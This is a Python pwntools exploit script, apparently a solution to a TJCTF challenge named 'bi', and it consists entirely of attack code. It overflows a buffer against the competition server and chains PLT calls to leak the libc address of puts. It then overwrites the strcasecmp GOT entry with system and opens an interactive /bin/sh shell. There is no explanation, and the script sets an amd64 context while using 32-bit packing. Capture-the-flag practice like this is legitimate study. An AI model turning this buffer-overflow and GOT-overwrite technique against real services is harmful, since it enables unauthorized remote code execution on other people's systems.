from pwn import *

context.update(arch = 'amd64', os='linux', log_level='debug')

p = remote('p1.tjctf.org', 8006)
#p = process('bi')

p.recvrepeat(2)

e = ELF('bi')
addr_plt_puts = e.plt['puts']
addr_got_puts = e.got['puts']
addr_plt_gets = e.plt['gets']
addr_got_strcmp = e.got['strcasecmp']

offset_systemToPuts = 0x2a650

addr_pop = 0x080496c6
log.info('addr_plt_gets: ' + hex(addr_plt_gets))
log.info('addr_plt_puts: ' + hex(addr_plt_puts))
log.info('addr_got_strcasecmp: ' + hex(addr_got_strcmp))

addr_main = 0x80485C8
addr_binsh = 0x8049EC0
addr_strcmp = 0x0804858F

offset_binsh = 0x11456f

p.sendline('a'*0x110 + p32(addr_plt_puts) + p32(addr_pop) + p32(addr_got_puts) + p32(addr_plt_gets) + p32(addr_pop) + p32(addr_got_strcmp) + p32(addr_plt_gets) + p32(addr_pop) + p32(addr_binsh) + p32(addr_strcmp) + p32(addr_binsh))

p.recvuntil(':(\n')
addr_libc_puts = u32(p.recv(4))
p.recvrepeat(1)

log.info('addr_libc_puts: ' + hex(addr_libc_puts))
addr_system = addr_libc_puts - offset_systemToPuts

log.info('addr_libc_system: ' + hex(addr_system))

p.send(p32(addr_system))

p.sendline('/bin/sh')
p.sendline('/bin/sh')
p.interactive()
